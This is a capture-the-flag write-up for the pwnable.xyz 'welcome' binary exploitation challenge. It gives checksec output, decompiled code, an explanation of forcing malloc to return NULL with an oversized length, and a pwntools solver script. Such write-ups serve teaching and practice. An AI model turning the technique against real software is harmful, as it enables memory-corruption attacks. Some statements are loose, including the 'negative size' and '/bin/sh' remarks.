# Welcome

<img align="left" width="100" height="24" src="https://img.shields.io/badge/category-pwn-blueviolet"><br></br>

# Synopsis

Take advantage of the leaked address and use it as a size so that `malloc` fails and returns zero.

# Description

Are you worthy to continue?        

## Skills Required

- `man` page of `malloc`.

## Skills Learned

- `malloc` fails when trying to allocate negative size, returning 0.

# Enumeration

First of all, we start with a `checksec`:  

```console
pwndbg> checksec
[*] '/home/w3th4nds/github/pwnable.xyz/welcome/welcome_xyz'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

### Protections 🛡️

As we can see:

| Protection | Enabled  | Usage   |
| :---:      | :---:    | :---:   |
| **Canary** | ✅      | Prevents **Buffer Overflows**  |
| **NX**     | ✅       | Disables **code execution** on stack |
| **PIE**    | ✅      | Randomizes the **base address** of the binary |
| **RelRO**  | **Full** | Makes some binary sections **read-only** |

The program's interface: 

```console
Welcome.
Leak: 0x7f583a325010
Length of your message: 123
Enter your message: 123
123
```

From the interface, the only thing we can get is a leak, which is not  shown here as it gets deleted after 1 second. Apart from that, we cannot find an obvious bug in the program.

### Disassembly

Starting with `main()`:

```c
undefined8 main(void)

{
  long *malloc_ret_value;
  void *__buf;
  long in_FS_OFFSET;
  size_t length;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  puts("Welcome.");
  malloc_ret_value = (long *)malloc(0x40000);
  *malloc_ret_value = 1;
  __printf_chk(1,"Leak: %p\n",malloc_ret_value);
  __printf_chk(1,"Length of your message: ");
  length = 0;
  __isoc99_scanf(&DAT_00100c50,&length);
  __buf = malloc(length);
  __printf_chk(1,"Enter your message: ");
  read(0,__buf,length);
  *(undefined *)((long)__buf + (length - 1)) = 0;
  write(1,__buf,length);
  if (*malloc_ret_value == 0) {
    system("cat /flag");
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

There are some interesting things here:

- We get a leak of the address returned from `malloc`:
  ```c
  malloc_ret_value = (long *)malloc(0x40000);
  *malloc_ret_value = 1;
  __printf_chk(1,"Leak: %p\n",malloc_ret_value);
  ```

- `  __isoc99_scanf(&DAT_00100c50,&length); `reads an `unsigned long integer`.

  ```c
                               DAT_00100c50                                    XREF[1]:     main:00100984(*)  
          00100c50 25              ??         25h    %
          00100c51 6c              ??         6Ch    l
          00100c52 75              ??         75h    u
          00100c53 00              ??         00h
  ```

- The `length` we give to `scanf`, is used to allocate memory to another buffer: `buf = malloc(length);`

  We write up to the given `length`  bytes to this buffer: `  read(0,__buf,length);`

  The last  byte of the buffer (in reality, `length - 1`) is assigned to 0: `*(undefined *)((long)__buf + (length - 1)) = 0;`

  Then, it checks if the address of the first allocated buffer is 0. If it is, it will call `system("cat /flag");`.

### Debugging 

There are some things we need to take into consideration. From the `man` page of `malloc`:

> RETURN VALUE The malloc() and calloc() functions return a pointer to the allocated  memory, which is suitably aligned for any built-in type.   On error,  these  functions return NULL.  NULL may also be returned by a  successful call to malloc() with a size of zero, or by a suc‐ cessful call to calloc() with nmemb or size equal to zero.

So, `malloc` can return 0 if the size (which we control), is 0 or if it fails. `malloc` fails when a negative value is given. Thus, the leaked address we get e.g. `0x7fad99950010`, will result in an integer overflow.

```console
>>> 0x7fad99950010
140383582748688
>>> 4294967295
```

This address as a decimal number is `140383582748688`. The `UINT_MAX` value is `4294967295`.

#### Exploitation path

The goal is to call `system("/bin/sh")`. To do so, we need to make `*malloc_ret_value == 0` true. The only place we have access over this address, is this: `  *(undefined8 *)((long)__buf + (length - 1)) = 0;`

Well, we don't have exact access there, but we can tamper with the leaked address. If we enter the `leaked address + 1` as size, it will result in a negative number, making `malloc` fail and return 0. After `malloc` returns zero, `*__buf` will be 0. Then, we have `leaked address + 1`. When we combine it with this one `*(undefined8 *)((long)__buf + (local_30 - 1)) = 0;`, it will make the leaked address (`*malloc_ret_value`) == 0, passing the comparison and giving the flag.

# Solution

```python
#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.log_level = 'critical'

LOCAL = False

if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote('svc.pwnable.xyz', 30000)

# Leak address
r.recvuntil('Leak: ')
leak = int(r.recvline().strip(), 16)
print(f'Leaked address: {leak:#04x}')

# Send leaked address + 1
r.sendlineafter('Length of your message: ', str(leak + 1))
r.sendlineafter('Enter your message: ', 'pwned');

r.interactive()
```

```console
welcome git:master ❯ python solver.py                                                                                                       ✭
Leaked address: 0x7f2054068010
FLAG{REDACTED}$ 
```

